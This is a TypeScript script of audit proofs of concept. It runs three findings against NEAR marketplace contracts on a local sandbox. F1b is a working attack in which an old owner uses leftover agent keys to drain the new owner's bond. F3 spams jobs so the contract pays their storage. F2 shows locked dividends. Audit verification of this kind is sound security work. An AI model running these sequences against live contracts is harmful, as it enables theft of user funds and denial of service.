// Audit PoCs (audit/findings/), run against the real contracts on a local sandbox (protocol 86).
//   npx tsx src/audit-poc.ts
// Each PoC prints CONFIRMED when the attack works, NOT REPRODUCED otherwise.
import { Sandbox, DEFAULT_ACCOUNT_ID, DEFAULT_PRIVATE_KEY } from "near-sandbox";
import { JsonRpcProvider, nearToYocto, type Account } from "near-api-js";
import { account, call, view, fmt, USDC, sleep, waitUntilChainTime } from "./chain.ts";
import { createAccount, createFirm, deployContract, wasm } from "./deploy.ts";
import { Swarm, bidHash } from "./swarm.ts";
import { Replay } from "./llm.ts";

const nope = { name: "none", author: "poc", house: false, bid: () => null, work: async () => "" };
const verdict = (name: string, ok: boolean, detail: string) => console.log(`${ok ? "CONFIRMED" : "NOT REPRODUCED"}  ${name}\n    ${detail}`);

async function failsWith(p: Promise<unknown>): Promise<string | null> {
  try {
    await p;
    return null;
  } catch (e) {
    return String((e as Error).message ?? e).slice(0, 160);
  }
}

async function main() {
  const sandbox = await Sandbox.start({ version: process.env.SANDBOX_VERSION ?? "2.13.4" });
  const provider = new JsonRpcProvider({ url: sandbox.rpcUrl });
  const root = account(DEFAULT_ACCOUNT_ID, provider, DEFAULT_PRIVATE_KEY as any);
  const mk = (n: string, near = "30") => createAccount(root, `${n}.${DEFAULT_ACCOUNT_ID}`, near, provider);
  try {
    const [usdc, tender, judge, alice, bob] = await Promise.all(["usdc", "tender", "judge", "alice", "bob"].map((n) => mk(n, n === "tender" ? "60" : "30")));
    const T = tender.acct.accountId;
    await deployContract(usdc.acct, wasm("mock_ft"), "new", {});
    await deployContract(tender.acct, wasm("tender"), "new", {
      config: {
        admin: T, judge: judge.acct.accountId, payment: { Ft: { token: usdc.acct.accountId } },
        dividend_bps: 3000, liquidation_fee_bps: 200, min_bond: USDC(5).toString(), slash: USDC(5).toString(),
        treasury_floor: USDC(2).toString(), epochs_before_liquidation: 2, epoch_secs: 2,
        liquidation_commit_secs: 3, liquidation_reveal_secs: 3,
      },
    });
    const ft = (from: Account, amount: bigint, msg: object | "") =>
      call(from, usdc.acct.accountId, "ft_transfer_call", { receiver_id: T, amount: amount.toString(), msg: msg === "" ? "" : JSON.stringify(msg) }, 1n);
    await call(usdc.acct, usdc.acct.accountId, "mint", { account_id: T, amount: "0" });
    // storage_deposit exists only after the F3 fix; on the old wasm these calls fail and are ignored.
    const storage = (a: Account, near: string, forId?: string) => failsWith(call(a, T, "storage_deposit", forId ? { account_id: forId } : {}, nearToYocto(near as any)));
    await storage(alice.acct, "2");
    await storage(bob.acct, "2");
    for (const a of [alice, bob]) {
      await call(usdc.acct, usdc.acct.accountId, "mint", { account_id: a.acct.accountId, amount: USDC(1000).toString() });
      await ft(a.acct, USDC(100), "");
      await call(a.acct, T, "deposit_bond", { amount: USDC(10).toString() }, 1n);
    }
    // X owned by alice (thin treasury, will be liquidated), Y owned by bob (the buyer).
    const X = await createFirm({ tenderAcct: tender.acct, provider, n: 1, owner: alice.acct, strategy: nope, budget: USDC(20), maxPerCall: USDC(20), budgetEpochSecs: 3600 });
    const Y = await createFirm({ tenderAcct: tender.acct, provider, n: 2, owner: bob.acct, strategy: nope, budget: USDC(20), maxPerCall: USDC(20), budgetEpochSecs: 3600 });
    await storage(alice.acct, "0.5", X.account);
    await storage(bob.acct, "0.5", Y.account);
    await ft(alice.acct, USDC(1), { Credit: X.account });
    await ft(bob.acct, USDC(50), { Credit: Y.account });

    // ------------------------------------------------------------ F1: old owner keeps the agent keys
    console.log("\n== F1  old owner keeps its agent keys after a takeover");
    const tenderPk = (await X.agentTender.getAccessKeyList()).keys.find((k: any) => k.access_key.permission.FunctionCall?.receiver_id === T)!.public_key;
    // Alice re-adds a key that already exists: the add_key action fails in its own receipt,
    // but the firm contract already pushed it to agent_keys.
    const dup = await failsWith(call(alice.acct, X.account, "add_agent_key", { public_key: tenderPk, on_tender: true }));
    if (dup) console.log(`    duplicate add_agent_key refused: ${dup}`);
    await sleep(1500);
    const st1 = await view(provider, X.account, "get_state");
    console.log(`    agent_keys recorded: ${st1.agent_keys.length} (2 real keys)`);

    const swarm = new Swarm(provider, T, [X, Y], judge.acct, new Replay(), judge.acct.accountId, () => {});
    for (let i = 0; i < 8 && (await view(provider, T, "get_firm", { firm_id: X.id })).status !== "Liquidating"; i++) {
      if (!(await swarm.tick())) await sleep(1000);
    }
    const auctionId = (await view(provider, T, "get_firm", { firm_id: X.id })).liquidation_auction;
    const salt = "s";
    await call(bob.acct, T, "commit_bid", { auction_id: auctionId, firm_id: Y.id, hash: bidHash(USDC(5), salt) });
    const a = await view(provider, T, "get_auction", { auction_id: auctionId });
    await waitUntilChainTime(provider, a.commit_end);
    await call(bob.acct, T, "reveal_bid", { auction_id: auctionId, firm_id: Y.id, amount: USDC(5).toString(), salt });
    await waitUntilChainTime(provider, a.reveal_end);
    await call(bob.acct, T, "settle", { auction_id: auctionId });
    await sleep(2000);
    const xf = await view(provider, T, "get_firm", { firm_id: X.id });
    const left = (await X.agentTender.getAccessKeyList()).keys.length;
    verdict("F1a takeover leaves the old owner's keys on the firm account", xf.owner === bob.acct.accountId && left > 0,
      `owner is now ${xf.owner}, owner_synced=${xf.owner_synced}, access keys still on ${X.account}: ${left}`);

    // Alice exploits the surviving tender key: she posts a job as client, bids for X (now Bob's firm,
    // backed by Bob's bond), delivers nothing, and collects the slash of Bob's bond.
    try {
    const aliceBefore = BigInt(await view(provider, T, "balance_of", { account_id: alice.acct.accountId }));
    const bobBondBefore = BigInt(await view(provider, T, "bond_of", { account_id: bob.acct.accountId }));
    await ft(alice.acct, USDC(10), { PostJob: { budget: USDC(10).toString(), brief: "anything", commit_secs: 3, reveal_secs: 3, deliver_secs: 60 } });
    const jobs: any[] = await view(provider, T, "get_jobs", { from: 0, limit: 10 });
    const job = jobs.at(-1);
    const ja = await view(provider, T, "get_auction", { auction_id: job.auction });
    await call(X.agentTender, T, "commit_bid", { auction_id: job.auction, firm_id: X.id, hash: bidHash(1n, "z") });
    await waitUntilChainTime(provider, ja.commit_end);
    await call(X.agentTender, T, "reveal_bid", { auction_id: job.auction, firm_id: X.id, amount: "1", salt: "z" });
    await waitUntilChainTime(provider, ja.reveal_end);
    await call(alice.acct, T, "settle", { auction_id: job.auction });
    await call(X.agentTender, T, "deliver", { job_id: job.id, result: "" });
    // The judge rejects an empty deliverable in every mode (ts/src/judge.ts obviouslyEmpty).
    await call(judge.acct, T, "verdict", { job_id: job.id, accept: false, attestation: "{}" });
    const aliceAfter = BigInt(await view(provider, T, "balance_of", { account_id: alice.acct.accountId }));
    const bobBondAfter = BigInt(await view(provider, T, "bond_of", { account_id: bob.acct.accountId }));
    // Alice put 10 USDC from her wallet into the job: net gain = ledger delta - 10.
    const net = aliceAfter - aliceBefore - USDC(10);
    verdict("F1b old owner steals the new owner's bond with the surviving key", net === USDC(5) && bobBondBefore - bobBondAfter === USDC(5),
      `alice net +${fmt(net)} USDC (ledger ${fmt(aliceBefore)} -> ${fmt(aliceAfter)} after paying 10 in), bob bond ${fmt(bobBondBefore)} -> ${fmt(bobBondAfter)}; repeatable per job until the bond is empty`);
    } catch (e) {
      verdict("F1b old owner steals the new owner's bond with the surviving key", false, `attack blocked: ${String((e as Error).message).slice(0, 140)}`);
    }

    // ------------------------------------------------------------ F2: dividends of firm-held shares are locked
    console.log("\n== F2  dividends on shares held by a firm account cannot be claimed");
    // X (now held 100% by Y's account) wins a paid job; 30% accrues to Y's holding.
    await ft(bob.acct, USDC(10), { PostJob: { budget: USDC(10).toString(), brief: "real work", commit_secs: 3, reveal_secs: 3, deliver_secs: 60 } });
    const j2 = (await view(provider, T, "get_jobs", { from: 0, limit: 10 })).at(-1);
    const a2 = await view(provider, T, "get_auction", { auction_id: j2.auction });
    await call(bob.acct, T, "commit_bid", { auction_id: j2.auction, firm_id: X.id, hash: bidHash(USDC(4), "q") });
    await waitUntilChainTime(provider, a2.commit_end);
    await call(bob.acct, T, "reveal_bid", { auction_id: j2.auction, firm_id: X.id, amount: USDC(4).toString(), salt: "q" });
    await waitUntilChainTime(provider, a2.reveal_end);
    await call(bob.acct, T, "settle", { auction_id: j2.auction });
    await call(bob.acct, T, "deliver", { job_id: j2.id, result: "a real deliverable of more than twenty characters" });
    await call(judge.acct, T, "verdict", { job_id: j2.id, accept: true, attestation: "{}" });
    const pending = BigInt(await view(provider, T, "pending_dividends", { firm_id: X.id, account_id: Y.account }));
    const byAgent = await failsWith(call(Y.agentTender, T, "claim_dividends", { firm_id: X.id }, 1n));
    const byOwner = await failsWith(call(bob.acct, T, "claim_dividends", { firm_id: X.id }, 1n));
    const bySettle = await failsWith(call(Y.agentTender, T, "settle_dividends", { firm_id: X.id, account_id: Y.account }));
    const left2 = BigInt(await view(provider, T, "pending_dividends", { firm_id: X.id, account_id: Y.account }));
    verdict("F2 holder firm cannot claim its dividends", pending > 0n && byAgent !== null && byOwner !== null && bySettle !== null,
      `pending ${fmt(pending)} USDC for ${Y.account}; claim by agent key: ${byAgent}; by owner: ${byOwner}; settle_dividends: ${bySettle ?? `ok, pending now ${fmt(left2)}`}`);

    // ------------------------------------------------------------ F3: storage paid by tender
    console.log("\n== F3  callers grow tender's storage for free");
    const acct0: any = await tender.acct.getState();
    const sb = async () => { try { return BigInt(await view(provider, T, "storage_balance_of", { account_id: alice.acct.accountId })); } catch { return 0n; } };
    const sb0 = await sb();
    const spam = 10;
    const nearBefore = (await alice.acct.getState()).balance.total;
    for (let i = 0; i < spam; i++) {
      await ft(alice.acct, 1n, { PostJob: { budget: "1", brief: "x".repeat(2000), commit_secs: 2592000, reveal_secs: 2592000, deliver_secs: 2592000 } });
    }
    const acct1: any = await tender.acct.getState();
    const nearAfter = (await alice.acct.getState()).balance.total;
    const used = BigInt(acct1.storageUsage) - BigInt(acct0.storageUsage);
    const lockedYocto = used * 10n ** 19n; // 1e19 yocto per byte
    const spent = nearBefore - nearAfter;
    const paidStorage = sb0 - (await sb());
    verdict("F3 tender pays the storage of spam jobs", used > 0n && paidStorage < lockedYocto,
      `${spam} jobs of 1e-6 USDC: tender storage +${used} bytes = ${Number(lockedYocto) / 1e24} NEAR; attacker paid ${Number(paidStorage) / 1e24} NEAR of it from its storage deposit, plus ${Number(spent) / 1e24} NEAR of gas`);
  } finally {
    await sandbox.tearDown();
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
